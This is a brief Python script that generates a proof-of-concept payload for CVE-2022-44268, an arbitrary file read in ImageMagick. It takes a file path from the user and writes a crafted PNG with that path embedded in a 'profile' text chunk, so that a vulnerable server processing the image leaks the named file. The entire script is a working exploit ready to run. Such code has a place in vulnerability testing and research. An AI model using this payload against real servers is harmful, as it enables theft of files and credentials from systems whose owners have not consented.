#!/usr/bin/env python3
"""
Create payload for CVE-2022-44268
Referance: https://www.metabaseq.com/imagemagick-zero-days/
"""

import argparse

# get file path from user with argparse
parser = argparse.ArgumentParser(description='Create payload for CVE-2022-44268')
parser.add_argument('-f', '--file', help='File path to be included in payload', required=True)
parser.add_argument('-o', '--output', help='Output file name', required=False, default="payload.png")

file_path = parser.parse_args().file
file_path_hex = file_path.encode("utf-8").hex()

# create payload
print("[+] Creating payload for file: " + file_path)
payload = "89504E470D0A1A0A0000000D4948445200000001000000010100000000376EF9240000000A49444154789C636800000082008177CD72B6000000147445587470726F66696C6500" + file_path_hex + "00B7F46D9C0000000049454E44AE426082"
payload = bytes.fromhex(payload)

# write payload to file
file_name = parser.parse_args().output
print("[+] Writing payload to file: {}".format(file_name))
with open(file_name, "wb") as file:
    file.write(payload)
